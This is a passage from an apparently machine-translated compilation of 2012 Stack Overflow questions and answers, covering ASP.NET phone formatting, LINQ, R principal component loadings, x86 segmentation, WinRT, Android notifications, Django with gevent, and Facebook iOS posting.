它使用 Iif 函数来处理 10 位数字条目的格式。

```
<asp:TemplateField HeaderText="Primary Phone:" SortExpression="PrimaryPhone">
    <EditItemTemplate>
        <asp:TextBox ID="TextBoxPrimaryPhoneEdit" runat="server" Text='<%# Bind("PrimaryPhone") %>'></asp:TextBox>
    </EditItemTemplate>

    <InsertItemTemplate>
        <asp:TextBox ID="TextBoxPrimaryPhoneInsert" runat="server" Text='<%# Bind("PrimaryPhone") %>'></asp:TextBox>
    </InsertItemTemplate>

    <ItemTemplate>
        <asp:Literal ID="PrimaryPhoneLiteral" runat="server" 
             Text='<%# iif(Len(Eval("PrimaryPhone"))=10,
             string.Format("{0:(###) ###-####}", Int64.Parse(Eval("PrimaryPhone").ToString())),
             Eval("PrimaryPhone")) %>' />
    </ItemTemplate>

    <ItemStyle ForeColor="Blue" />
</asp:TemplateField> 
```

我们想从 VB.Net 代码隐藏文件中格式化 PrimaryPhone 而不是 Iif 函数，因为电话号码可能是：

```
10 digits
 7 digits 
```

一些电话号码也丢失了。

我们希望根据输入到 PrimaryPhone DetailsView TextBox 中的数字长度对其进行格式化。我们希望为此使用 Case 语句。

是否也可以验证 EditItemTemplate 和 InsertItemTemplate 中的电话号码条目，并在电话号码不是 10 位或 7 位数字时显示 Ajax 验证标注扩展程序？

您能否显示从代码隐藏文件中格式化 PrimaryPhone 所需的编码？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-06T14:51:00.107

在 CodeBehind 文件中编写一个公共静态函数并从 aspx 页面调用它，并传递电话值。

（我在这里使用 C# 代码，但你应该明白）

```
public static string FormatPhoneNumber(string phoneNumber)
{
    // do your conditional formatting here
    return result;
} 
```

并在您的 ItemTemplate 中：

```
<ItemTemplate>
    <asp:Literal ID="PrimaryPhoneLiteral" runat="server" 
         Text='<%# FormatPhoneNumber(Eval("PrimaryPhone").ToString()) %>' />
</ItemTemplate> 
```

# c# - 从模型中获取最后几个值

> ID：12760104
> 
> 赞同：0
> 
> 时间：2012-10-06T13:13:45.577
> 
> 标签：c#, asp.net-mvc, linq

我正在列出`Article`模型中的文章。

为了得到所有这些，我自然会使用

```
var articles = db.Articles; 
```

只得到最后一个：

```
var lastArticle = db.Articles.Last(); 
```

但现在我应该得到，比方说，最后四个？

文章型号：

```
ID
Name
DateCreated
Image
Content 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-06T13:18:43.273

您可以反向排序并获取前 N 个元素：

```
db.Articles.OrderByDescending(a => a.DateCreated).Take(4) 
```

如果您希望结果按升序排列，您可以附加`.OrderBy(a => a.DateCreated)`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-06T13:18:53.530

```
var takeLast = db.Articles.OrderByDescending(d => d.ID).Take(4); 
```

这一切都取决于您将订购什么

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-06T13:20:12.800

试试这个：

```
db.Articles.OrderByDescending(a => a.DateCreated).Take(4).ToList() 
```

另外，如果您想创建分页，请使用：

```
db.Articles.OrderBy(a => a.DateCreated).Skip(20).Take(4).ToList() 
```

# r - 主成分分析 - 如何获得每个参数对 Prin.Comp. 的贡献 (%)？

> ID：12760108
> 
> 赞同：29
> 
> 时间：2012-10-06T13:14:15.497
> 
> 标签：r, statistics, princomp

我想知道测量/参数对计算出的主成分之一的贡献程度。

真实世界的描述：

1.  我有五个关于物种地理分布的气候参数
2.  我用这五个参数执行了 PCA
3.  PC1 与 PC2 的图显示了一个有趣的模式

问题：如何获得（每个参数的）对每台 PC 的贡献百分比？

我所期望的：PC1 由参数 1 的 30%、参数 2 的 50%、参数 3 的 20%、参数 4 的 0% 和参数 5 的 0% 组成。PC2由...

带有 5 个虚拟参数的示例：

```
a <- rnorm(10, 50, 20)
b <- seq(10, 100, 10)
c <- seq(88, 10, -8)
d <- rep(seq(3, 16, 3), 2)
e <- rnorm(10, 61, 27)

my_table <- data.frame(a, b, c, d, e)

pca <- princomp(my_table, cor=T)

biplot(pca) # same: plot(pca$scores[,1], pca$scores[,2])

pca
summary(pca) 
```

我的信息隐藏在哪里？

* * *

## 回答 #1

> 赞同：48
> 
> 时间：2012-10-06T13:45:35.947

您想要`$loadings`返回对象的组件：

```
R> class(pca$loadings)
[1] "loadings"
R> pca$loadings

Loadings:
  Comp.1 Comp.2 Comp.3 Comp.4 Comp.5
a -0.198  0.713        -0.671       
b  0.600         0.334 -0.170  0.707
c -0.600        -0.334  0.170  0.707
d  0.439        -0.880 -0.180       
e  0.221  0.701         0.678       

               Comp.1 Comp.2 Comp.3 Comp.4 Comp.5
SS loadings       1.0    1.0    1.0    1.0    1.0
Proportion Var    0.2    0.2    0.2    0.2    0.2
Cumulative Var    0.2    0.4    0.6    0.8    1.0 
```

请注意，这有一种特殊的`print()`方法可以抑制小负载的*打印*。

如果您希望将其作为相对贡献，则将每列的负载相加，并将每个负载表示为列（负载）总和的比例，注意使用绝对值来解释负负载。

```
R> load <- with(pca, unclass(loadings))
R> load
      Comp.1       Comp.2      Comp.3     Comp.4        Comp.5
a -0.1980087  0.712680378  0.04606100 -0.6713848  0.000000e+00
b  0.5997346 -0.014945831  0.33353047 -0.1698602  7.071068e-01
c -0.5997346  0.014945831 -0.33353047  0.1698602  7.071068e-01
d  0.4389388  0.009625746 -0.88032515 -0.1796321  5.273559e-16
e  0.2208215  0.701104321 -0.02051507  0.6776944 -1.110223e-16 
```

然后，这最后一步产生对每个主成分的比例贡献

```
R> aload <- abs(load) ## save absolute values
R> sweep(aload, 2, colSums(aload), "/")
      Comp.1      Comp.2     Comp.3     Comp.4       Comp.5
a 0.09624979 0.490386943 0.02853908 0.35933068 0.000000e+00
b 0.29152414 0.010284050 0.20665322 0.09091055 5.000000e-01
c 0.29152414 0.010284050 0.20665322 0.09091055 5.000000e-01
d 0.21336314 0.006623362 0.54544349 0.09614059 3.728970e-16
e 0.10733880 0.482421595 0.01271100 0.36270762 7.850462e-17

R> colSums(sweep(aload, 2, colSums(aload), "/"))
Comp.1 Comp.2 Comp.3 Comp.4 Comp.5 
     1      1      1      1      1 
```

* * *

如果使用首选`prcomp()`，则相关负载在`$rotation`组件中：

```
R> pca2 <- prcomp(my_table, scale = TRUE)
R> pca2$rotation
         PC1          PC2         PC3        PC4           PC5
a -0.1980087  0.712680378 -0.04606100 -0.6713848  0.000000e+00
b  0.5997346 -0.014945831 -0.33353047 -0.1698602 -7.071068e-01
c -0.5997346  0.014945831  0.33353047  0.1698602 -7.071068e-01
d  0.4389388  0.009625746  0.88032515 -0.1796321 -3.386180e-15
e  0.2208215  0.701104321  0.02051507  0.6776944  5.551115e-17 
```

现在相关的咒语是：

```
R> aload <- abs(pca2$rotation)
R> sweep(aload, 2, colSums(aload), "/")
         PC1         PC2        PC3        PC4          PC5
a 0.09624979 0.490386943 0.02853908 0.35933068 0.000000e+00
b 0.29152414 0.010284050 0.20665322 0.09091055 5.000000e-01
c 0.29152414 0.010284050 0.20665322 0.09091055 5.000000e-01
d 0.21336314 0.006623362 0.54544349 0.09614059 2.394391e-15
e 0.10733880 0.482421595 0.01271100 0.36270762 3.925231e-17 
```

# x86 - x86 数据段在实际操作系统和进程中是如何使用的？

> ID：12760109
> 
> 赞同：3
> 
> 时间：2012-10-06T13:14:29.573
> 
> 标签：x86, operating-system, x86-64, memory-segmentation

我一直在实模式下编写 x86 asm 程序（引导加载程序），并且我知道如何使用段、寄存器和类似的东西。

我从 OllyDbg 之类的调试器和类似的调试器中看到 DS 寄存器、SS 等……显然被使用了……但是普通的“类似 Windows”的进程如何使用它们呢？我知道分段被部分使用（只是为了将 ring0 与 ring3 分开）并且它们的条目在 GDT 中，我知道这涉及到分页，这会完全混淆 PDE 和 PTE 的地址，但我不能完全“链接” 将所有内容放在一起并了解数据堆栈额外段的全部内容。每个进程是否有不同的 DS/SS/ES？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-06T18:43:28.670

来自 1986 年英特尔 80386 程序员参考手册：

```
Figure 5-1\.  Address Translation Overview

             15           0      31                           0
    LOGICAL ╔═══════════════╗   ╔══════════════════════════════╗
    ADDRESS ║    SELECTOR   ║   ║            OFFSET            ║
            ╚═══════════╤═══╝   ╚═══╤══════════════════════════╝
                        v           v
                     ╔══════════════════════════════╗
                     ║     SEGMENT TRANSLATION      ║
                     ╚══════════════╤═══════════════╝
                                 ╔══╧═╗       PAGING ENABLED
                                 ║PG ?╟────────────────────┐
                                 ╚══╤═╝                    │
                   31        PAGING v DISABLED       0     │
          LINEAR  ╔═══════════╦═══════════╦═══════════╗    │
          ADDRESS ║    DIR    ║   PAGE    ║  OFFSET   ║    │
                  ╚═══════════╩═════╤═════╩═══════════╝    │
                                    v                      │
                     ╔══════════════════════════════╗      │
                     ║       PAGE TRANSLATION       ║      │
                     ╚══════════════╤═══════════════╝      │
                                    │&lt;─────────────────────┘
                      31            v              0
            PHYSICAL ╔══════════════════════════════╗
            ADDRESS  ║                              ║
                     ╚══════════════════════════════╝

Figure 5-2\.  Segment Translation

           15              0    31                                   0
  LOGICAL ╔════════════════╗   ╔═════════════════════════════════════╗
  ADDRESS ║    SELECTOR    ║   ║                OFFSET               ║
          ╚═══╤═════════╤══╝   ╚═══════════════════╤═════════════════╝
       ┌──────┘         v                          │
       │ DESCRIPTOR TABLE                          │
       │  ╔════════════╗                           │
       │  ║            ║                           │
       │  ║            ║                           │
       │  ║            ║                           │
       │  ║            ║                           │
       │  ╠════════════╣                           │
       │  ║  SEGMENT   ║ BASE          ╔═══╗       │
       └─>║ DESCRIPTOR ╟──────────────>║ + ║&lt;──────┘
          ╠════════════╣ ADDRESS       ╚═╤═╝
          ║            ║                 │
          ╚════════════╝                 │
                                         v
              LINEAR  ╔════════════╦═══════════╦══════════════╗
              ADDRESS ║    DIR     ║   PAGE    ║    OFFSET    ║
                      ╚════════════╩═══════════╩══════════════╝ 
```

在 Windows 中，大多数时间在大多数进程中 DS=ES=SS，并且 CS 和 DS 的值在所有进程之间共享。进程可能会更改它们的段寄存器，但它很少需要，因此大多数时候您会看到相同的 CS 和 DS/ES/SS 值集。内核使用自己的 CS 和 DS。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-06T18:41:35.513

通常，在 x86 保护模式和 x86-64 长模式下，实际上不使用分段（平面内存模型）。有四个主要的段描述符，每个都允许访问整个地址空间：ring0 代码、ring0 数据、ring3 代码、ring3 数据。使用分页来强制执行内存保护。因此，通常所有进程都被赋予相同的 CS、DS、SS、ES 值。

请注意，某些操作系统在寻址本地数据时使用 FS 和 GS 段，例如[Windows 中的 TIB](http://en.wikipedia.org/wiki/Win32_Thread_Information_Block)。

还值得一提的是，虽然在 x86 保护模式下这种行为是可选的，内核可以自由使用多个段来保护内存，但在 x86-64 长模式下，分段通常被禁用，操作系统被迫使用平面内存模型（尽管它仍然可以使用 FS 和 GS 来寻址本地数据和操作系统结构）。

您可能还想查看有关 x86 和 x86-64 架构的宝贵信息来源：[Intel Manual 3A](http://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-software-developer-vol-3a-part-1-manual.pdf)（第 3.2 节应该澄清您对分段的所有疑问）

# c# - 从 FileStream（或类似）打开 Excel/Word 文件

> ID：12760117
> 
> 赞同：3
> 
> 时间：2012-10-06T13:15:27.763
> 
> 标签：c#, .net, office-interop

我正在使用 C#、.NET 4.0 和 office interop 库来读取文件的内容。

我正在从 BLOB 读取 office 文件，所以我想知道是否有办法直接输入文件流而不是从磁盘打开它？也许我需要为此使用另一个库？

编辑：我应该注意到它也需要支持旧的办公格式！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-06T13:21:34.677

这可能会有所帮助：[如何：从流中打开文字处理文档](http://msdn.microsoft.com/en-us/library/office/ff478386.aspx)

# c# - netTiers 如何传递数据？

> ID：12760119
> 
> 赞同：2
> 
> 时间：2012-10-06T13:16:07.277
> 
> 标签：c#, asp.net, vb.net, .nettiers

我已经使用 netTiers 生成了代码。一切正常，但我想做一些修改。

例如：我有一个`column[dataType varchar]`（在表中）来存储 imageURL。对于相同的 netTiers 生成一个`TextBox`. 我想用 替换`TextBox`，`FileUpload`将图像保存在文件夹中并将 URL 插入数据库。

我在这里面临的问题是我不知道 netTiers 是如何传递数据的。插入查询在哪里？他们在按钮中也没有任何内容 click :O 。我尝试在整个解决方案中搜索按钮`ID`，但没有一次出现。

你们能指点我一篇好文章或任何有用的资源吗？我试图掌握它，但似乎需要一些时间。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-15T20:38:27.900

插入查询在 Procedure.xml 的数据层中 数据在层之间传递。首先阅读来自 nettiers 网页的文档（无论它是否不完整）。您必须了解业务、数据和服务层是如何工作的，并且您将了解表示层。如果您不喜欢表示层的生成方式，您可以自己生成，并且只使用业务、数据和服务层。

# c# - 如何打造流畅的跳跃动作？

> ID：12760126
> 
> 赞同：1
> 
> 时间：2012-10-06T13:17:06.203
> 
> 标签：c#, xna

我有这个球，当 OnClick 需要向上跳跃 150 像素并再次向下跳跃时。它需要在总共 1 秒（1000 毫秒）内完成此操作。

我尝试了几种方法。一个把时间一分为二，先上升，后半段下降……但它有点不稳定，也不是那么顺利。

有人有想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-06T13:25:21.340

您需要一条从零开始并在 t = 1 时返回零的倒置抛物线。公式为：

```
y = k * t * (1 - t) 
```

要计算出*k*，代入 ( *t* , *y* ) = (0.5, 150) 并求解*k*。

# java - 使用 Objectify4 的祖先查询

> ID：12760129
> 
> 赞同：0
> 
> 时间：2012-10-06T13:17:45.023
> 
> 标签：java, objectify

我正在尝试这样做：

```
Resource resource = (Resource) ofy().load().ancestor(new Key<Resource>(Resource.class, key)).first().getValue(); 
```

这种模式在 v3 之前有效，但在 v4 中它不会因为

```
The constructor Key<Resource>(Class<? extends T>, String) is not visible 
```

如何使用 Objectify4 进行祖先查询>

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T16:29:31.527

您使用`Key.create()`.

# ios - 尝试获取属性值时发送到实例的无法识别的选择器

> ID：12760133
> 
> 赞同：0
> 
> 时间：2012-10-06T13:18:06.517
> 
> 标签：ios, mapkit, mkannotationview

已经在这里发布的许多问题中的错误是相同的，但我想原因是不同的。

我有 3 个类：`MapView.m`显示地图及其绘制的图钉。`Pins.m`管理所有引脚数据，并`PinsCalloutAnnotationView.m`从`MKAnnotationView`注释的标注扩展并管理。

我的问题在这堂课上，`PinsCalloutAnnotationView.m`：

```
- (id)initWithAnnotation:(id<MKAnnotation>)annotation reuseIdentifier:(NSString *)reuseIdentifier  {

    self = [super initWithAnnotation:annotation reuseIdentifier:reuseIdentifier];
    if (self) {
        if (((Pins*)annotation).isHootPin) {
            [self updateHootPin:t.hoot];
    }
    return self;
} 
```

当我尝试读取属性`isHootPin`时，应用程序崩溃并且我得到了这个堆栈：

```
[PinsCalloutAnnotationView isHootPin]: unrecognized selector sent to instance 0x203312d0 
```

该属性在课堂上非常综合`Pins`：

```
@property (nonatomic, readwrite)BOOL isHootPin; 
```

和

```
@synthesize isHootPin; 
```

我在创建它时设置了它的值`MapView.m`

```
pin.isHootPin=YES; 
```

这有什么问题吗？提前谢谢。

**编辑：**

调用方法的类`initWithAnnotation`是`MapView`.

```
- (MKAnnotationView *)mapView:(MKMapView *)mapV viewForAnnotation:(id<MKAnnotation>)annotation
{
    MKAnnotationView *annotationView;

    if ([annotation isMemberOfClass:[Pins class]]) {

        if (((Pins *)annotation).isHootPin) {
            NSString * annotationId = @"hootpin";
            annotationView = [mapView dequeueReusableAnnotationViewWithIdentifier:annotationId];

            if (!annotationView) {
                annotationView = [[MKAnnotationView alloc] initWithAnnotation:annotation reuseIdentifier:annotationId];
            }
        }
    }
} 
```

如您所见，在调用之前`initWithAnnotation`，我进行了测试，它是否具有`isHootPin`设置为 yes 的属性，如果是，我调用`initWithAnnotation`。即使在 中`initWithAnnotation`，我也需要确定注释`isHootPin`是否是。如果是，我为注释做一个特定的布局配置。所以：

```
- (id)initWithAnnotation:(id<MKAnnotation>)annotation reuseIdentifier:(NSString *)reuseIdentifier  {

    self = [super initWithAnnotation:annotation reuseIdentifier:reuseIdentifier];
    if (self) {
        if (((Pins*)annotation).isHootPin) {//Try to check, but get crash and exception
            [self updateHootPin:t.hoot];
    }
    return self;
} 
```

# google-apps-script - 谷歌应用脚 本：如何确定屏幕分辨率？

> ID：12760135
> 
> 赞同：5
> 
> 时间：2012-10-06T13:18:08.933
> 
> 标签：google-apps-script, resolution

我正在尝试在 Google 应用程序脚本中创建一个应用程序，但我想根据屏幕的分辨率（移动和桌面）显示不同的布局。但是，我找不到有关如何确定屏幕分辨率的任何信息。

当然，我无法从服务器端确定屏幕分辨率，所以我尝试了是否可以使用客户端处理程序做一些事情，但是`ClientHandlers`没有任何屏幕分辨率方法。我还尝试使用 向应用程序添加手动客户端脚本`app.createHTML()`，但是 Google 不允许使用 createHTML 包含 javascript。

那么如何使用 Google Apps 脚本获得浏览器的分辨率呢？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-08T06:47:41.040

The JavaScript [screen.witdth](http://www.w3schools.com/jsref/prop_screen_width.asp) property does not work in GAS environment. The Google Caja sanitizer, which is under the hood of GAS, throws the

> Uncaught script error: 'screen is not defined.' in source: 'tryit.asp?filename=tryjsref%5fscreen%5fwidth' at line: 7 tryit.asp?filename=tryjsref%5fscreen%5fwidth:7: screen is not defined.

exception if to load the following HTML page to the [Caja Playground](http://caja.appspot.com). Probably it is an issue of Caja.

```
<!DOCTYPE html>
<html>
<body>

<script>

document.write("Test");
document.write("Total Width: " + screen.width);

</script>

</body>
</html> 
```

A possible workaround is not to rely upon a screen resolution but to use a user-agent string. This string contains the user browser "id". The [UiApp.getUserAgent](https://developers.google.com/apps-script/class_uiapp#getUserAgent) method returns it. For instance, Mozilla Firefox on a desktop provides this string like - `Mozilla/5.0 (Windows NT 6.0; rv:15.0) Gecko/20100101 Firefox/15.0.1,gzip(gfe)`. On a mobile phone this string contains `...(Android; Mobile; rv:15.0)...`. A check procedure searches in the returned string the words `Mobile`, `Android`, etc. If one of them found it is a mobile platform and the main code draws a mobile GUI using relative controls sizes. The following code shows how to use it

```
function doGet(e) {
  var app = UiApp.createApplication();
  app.add(app.createLabel(UiApp.getUserAgent()));
  return app;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-07T15:04:14.957

目前没有已知的方式来执行此 UI 应用程序。但是，使用 Google Apps Script 中的 HtmlService（不是您提到的 createHTML()），您可以添加 JavaScript 并使用 JavaScript、HTMl 和 CSS 构建整个 UI。

有关文档，请参阅[https://developers.google.com/apps-script/class_htmlservice](https://developers.google.com/apps-script/class_htmlservice)

# azure - 无法在 Windows azure 中发布

> ID：12760139
> 
> 赞同：0
> 
> 时间：2012-10-06T13:18:28.403
> 
> 标签：azure, azure-storage, azure-web-roles

我已按照以下步骤操作：

*   首先下载publishsettings文件
*   然后导入它。

但是导入给了我这样的错误 `There is an error in XML Document (0 0)`，然后下次我甚至重新安装了所有东西。这个错误不断出现，没有给我选择其他发布设置文件的选项。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-06T13:41:02.553

打开解决方案资源管理器，打开项目并在其下打开 Properties 文件夹。在那里，您将看到 publishprofile 文件。删除这些。转到门户，下载新的发布设置文件并再次导入这些文件。

![在此处输入图像描述](../Images/ed78243fd2426eb75e4be0b8ec64f989.png)

# internet-explorer-9 - IE9 中的 D3 问题

> ID：12760141
> 
> 赞同：4
> 
> 时间：2012-10-06T13:18:45.357
> 
> 标签：internet-explorer-9, d3.js

我对 IE9 中的 D3 有一个简单的问题。

在 Chrome/Firefox 和 IE9 中查看此示例。--> [http://bl.ocks.org/d/1005873/](http://bl.ocks.org/d/1005873/)

单击一个块以使用缩放功能。它适用于 Chrome，但 IE9 无法在缩放时“隐藏”所有其他元素。显示“div”块外的内容。

我想知道如何解决这个问题。一种方法是将图表集成到 iframe 中，例如在此页面上：http: [//bl.ocks.org/1005873](http://bl.ocks.org/1005873)

但我想知道是否有更好的方法来设置 D3 以避免 iframe 解决方法。

非常感谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-06T15:52:24.357

要解决此问题，您可以添加宽度并隐藏`chart`div 的溢出。添加以下内容后，IE9 按我的预期工作。

```
<div id="chart" style="width: 960px; overflow: hidden;"> 
```

# windows-8 - 如何使用 C# 在 **winrt** 应用程序中查看特定设置页面？

> ID：12760142
> 
> 赞同：0
> 
> 时间：2012-10-06T13:18:44.593
> 
> 标签：windows-8, microsoft-metro, windows-runtime

如何使用 C# 从外部按钮单击查看**Winrt应用程序中的特定设置页面？**

在javascript中我发现这样 *WinJS.UI.SettingsFlyout.showSettings("About", "/Settings/About.html")*

但我无法在 c# 中找到它，我正在使用**callisto**设置 Flyouts

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-07T10:21:18.707

我也在使用 Callisto 和 C#，这就是我解决问题的方法。

```
 void OnCommandsRequested(SettingsPane sender, SettingsPaneCommandsRequestedEventArgs args)
    {
        var settings = new SettingsCommand("settings", "Settings", new UICommandInvokedHandler(showSettings));
        args.Request.ApplicationCommands.Add(settings);
        var credits = new SettingsCommand("credits", "Credits", new UICommandInvokedHandler(showCredits));
        args.Request.ApplicationCommands.Add(credits);
    }

    public void showSettings(IUICommand command)
    {
        var settings = new SettingsFlyout();
        settings.Content = new SettingsUserControl();
        settings.HeaderBrush = new SolidColorBrush(_background);
        settings.Background = new SolidColorBrush(_background);
        settings.HeaderText = "Settings";
        settings.IsOpen = true;
    }

    public void showCredits(IUICommand command)
    {
        var settings = new SettingsFlyout();
        settings.Content = new CreditsUserControl();
        settings.HeaderBrush = new SolidColorBrush(_background);
        settings.Background = new SolidColorBrush(_background);
        settings.HeaderText = "Credits";
        settings.IsOpen = true;
    } 
```

然后从其他页面我可以打电话

```
((App)Application.Current).showCredits(null); 
```

或者

```
((App)Application.Current).showSettings(null); 
```

要调出我想查看的设置窗格 :o)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-06T13:41:44.187

第一步是在您希望显示设置的页面的 SettingsPane 上为 CommandsRequest 事件添加一个侦听器。例如：

```
SettingsPane.GetForCurrentView().CommandsRequested += MainPage_CommandsRequested; 
```

然后定义事件处理程序

```
void MainPage_CommandsRequested(SettingsPane sender, SettingsPaneCommandsRequestedEventArgs args)
{
    SettingsCommand generalCommand = new SettingsCommand("GeneralSettings", ResourceLoader.GetString("GeneralText"), (x) =>
    {
        SettingsFlyout settings = new SettingsFlyout();
        settings.HeaderBrush = Resources["SettingsHeaderBrush"] as SolidColorBrush;
        settings.HeaderText = ResourceLoader.GetString("GeneralText");
        settings.Background = new SolidColorBrush(Windows.UI.Colors.White);
        settings.Content = new GeneralSettingsFlyout();
        settings.IsOpen = true;
        settings.Height = Window.Current.Bounds.Height;

        // Optionally, add a closed event handler
        settings.Closed += settings_Closed;
    });
} 
```

请注意，在这种情况下，GeneralSettingsFlyout 只是一个页面，一旦选择了该特定设置，它将被加载到设置窗格中（Callisto 会自动处理这个）。

SettingsFlyout 是 Callisto 的类。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-07T04:43:54.620

**编辑您的 app.xaml 文件并为您的代码引用此代码段：**

```
App::OnLaunched()
{
.
.
     var rootFrame = new CharmFrame { CharmContent = new CharmFlyouts() };
     SuspensionManager.RegisterFrame(rootFrame, "AppFrame");
.
.
} 
```

**然后，当您要显示该设置时，请执行以下操作：**

```
SomeOtherMethod()
{
     ((Window.Current.Content as CharmFrame).CharmContent as CharmFlyouts).ShowSettings();
} 
```

# android - 设置后如何取消通知？

> ID：12760145
> 
> 赞同：0
> 
> 时间：2012-10-06T13:19:14.660
> 
> 标签：android, android-notifications, android-alarms

我以这种方式设置了通知：

```
public void onReceive(Context context, Intent intent) {
    nm = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);

    Bundle bundle = intent.getExtras();

    CharSequence from = bundle.getString("alarm_title");
    CharSequence message = bundle.getString("alarm_text");
    int notify_id = bundle.getInt("notify_id");

    Intent notifyIntent = new Intent(context, AppActivity.class);
    notifyIntent.setFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);

    PendingIntent contentIntent = PendingIntent.getActivity(context, 0, notifyIntent, 0);

    Notification notif = new Notification(R.drawable.ic_menu_glases, "App Information", System.currentTimeMillis());
    notif.contentIntent = contentIntent;
    notif.setLatestEventInfo(context, from, message, contentIntent);
    notif.flags = Notification.FLAG_AUTO_CANCEL;

    nm.notify(notify_id, notif); 
```

}

一切正常，我很满意。现在我想`cancel`通过 ID 通知。

我的**第一次尝试**失败（警报仍然出现）：

```
AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
Intent intent = new Intent(getApplication(), AlarmReceiver.class);
PendingIntent pendingIntent = PendingIntent.getBroadcast(getApplication(), notifyID, intent, PendingIntent.FLAG_ONE_SHOT);
if(pendingIntent != null) {
    am.cancel(pendingIntent);
    pendingIntent.cancel();  
} 
```

**第二次尝试**也失败了：

```
NotificationManager nm = (NotificationManager) getApplication().getSystemService(Context.NOTIFICATION_SERVICE);
nm.cancel(notify_id); 
```

有人知道如何在设置后停止通知吗？谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-06T13:25:11.317

使用此代码

```
String ns = Context.NOTIFICATION_SERVICE;
NotificationManager nMgr = (NotificationManager) ctx.getSystemService(ns);
nMgr.cancel(notify_id); 
```

在您的代码中，我更改`notifyID`为`notify_id`. 通知 ID 应与创建通知时使用的 ID 相同。只需检查一下，它应该可以正常工作，如[api](http://developer.android.com/reference/android/app/NotificationManager.html#cancel%28int%29)中所述。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-06T13:25:52.107

试试这个代码：

```
String ns = Context.NOTIFICATION_SERVICE;
NotificationManager mNotificationManager;
mNotificationManager = (NotificationManager) getSystemService(ns);
mNotificationManager.cancel(MY_NOTIFICATION_ID); 
```

# python - 想要守护 django-gev ent 服务器

> ID：12760147
> 
> 赞同：1
> 
> 时间：2012-10-06T13:19:32.257
> 
> 标签：python, django, gevent, django-wsgi, python-daemon

在我的项目中，我使用猴子补丁将 django-development 服务器替换为 gevent 并且它运行良好，所以现在我的 manage.py 文件看起来像 -

```
from gevent import monkey; monkey.patch_all()
from gevent.wsgi import WSGIServer
from django.core.management import setup_environ
import settings
setup_environ(settings)

from django.core.handlers.wsgi import WSGIHandler as DjangoWSGIApp
application = DjangoWSGIApp()
server = WSGIServer(("192.168.0.14", 8080), application)
try:
 print "Starting Green server on http://192.168.0.14:8000"
 server.serve_forever()
except KeyboardInterrupt:
 server.stop()
 print "server has stopped by Admin" 
```

所以这对我来说很好，当我正常运行它时。然后我尝试将它托管在我们的私有云上​​，因为我使用了三个实例，一个用于`openid provider`，另一个用作`openid consumer`，一个用于`mongodb`，它也按预期工作，但我遇到了一些`cross domain`问题，所以我现在`proxy`使用解决这个问题。

问题-

1- 使用云实例

然后我尝试使用 ( `python manage.py &`) 守护脚本，以便我可以关闭与我的实例的 ssh 连接，在守护进程后我能够使用第一个实例，但是每当我尝试登录或注销时，我都会得到`I/O error`。

2-在开发PC上

守护进程后，`i tried to access the url, it wasn't connecting`当我使用“ps aux | grep manage.py”检查进程时，脚本在那里运行。

我想我在守护这个脚本时遗漏了一些东西。我使用了`python daemon`图书馆，但这也不起作用。

# ios - 使用 IOS SDK 3.0 发布到朋友墙

> ID：12760150
> 
> 赞同：2
> 
> 时间：2012-10-06T13:19:40.460
> 
> 标签：ios, image, facebook-graph-api, posting

我可以使用以下内容在用户墙上发布图像：-

```
if (appDelegate.session.isOpen)
    {
        FBSession.activeSession  = appDelegate.session;            
        [FBRequestConnection startForUploadPhoto:img 
                               completionHandler:^(FBRequestConnection *connection, id result, NSError *error) {
                                   [self showAlert:@"eCard Posted" result:result error:error];
                               }];

    } 
```

现在的要求是从朋友选择器类中挑选朋友并将图像发布在所选朋友墙/时间线上。

我已将 Friends 选择器类集成如下：-

```
if (appDelegate.session.isOpen)
    {
         FBSession.activeSession  = appDelegate.session; 
        if (self.friendPickerController == nil) {
            // Create friend picker, and get data loaded into it.
            self.friendPickerController = [[FBFriendPickerViewController alloc] init];
            self.friendPickerController.title = @"Pick Friends";
            self.friendPickerController.delegate = self;
        }

        [self.friendPickerController loadData];
        [self.friendPickerController clearSelection];            
        [self presentModalViewController:self.friendPickerController animated:YES];

   } 
```

现在在委托方法中：-

```
- (void)facebookViewControllerDoneWasPressed:(id)sender {

// we pick up the users from the selection, and create a string that we use to update the text view
// at the bottom of the display; note that self.selection is a property inherited from our base class
//UIImage *img = self.image;
    FBSession.activeSession = appDelegate.session;

for (id<FBGraphUser> user in self.friendPickerController.selection) {   

    FBSession.activeSession  = appDelegate.session; 
    if (appDelegate.session.isOpen)
    {            
        NSMutableDictionary  *postVariablesDictionary = [[NSMutableDictionary alloc] init];
       // [postVariablesDictionary setObject:@"me" forKey:@"name"]; 
       // [postVariablesDictionary setObject:self.image forKey:@"picture"];
        [postVariablesDictionary setObject:@"Sample Text" forKey:@"message"];
         NSLog(@"%@",user.id);
        [FBRequestConnection startForPostWithGraphPath:[NSString stringWithFormat:@"%@/feed",user.id] graphObject:[NSDictionary dictionaryWithDictionary:postVariablesDictionary] completionHandler:nil];

     }    
    else 
    {
        if (appDelegate.session.state != FBSessionStateCreated) {
            // Create a new, logged out session.
            appDelegate.session = [[FBSession alloc] init];
        }            
        // if the session isn't open, let's open it now and present the login UX to the user
        [appDelegate.session openWithCompletionHandler:^(FBSession *session, 
                                                         FBSessionState status, 
                                                         NSError *error) {
        }];
    } 

}

[self dismissModalViewControllerAnimated:YES]; 
```

}

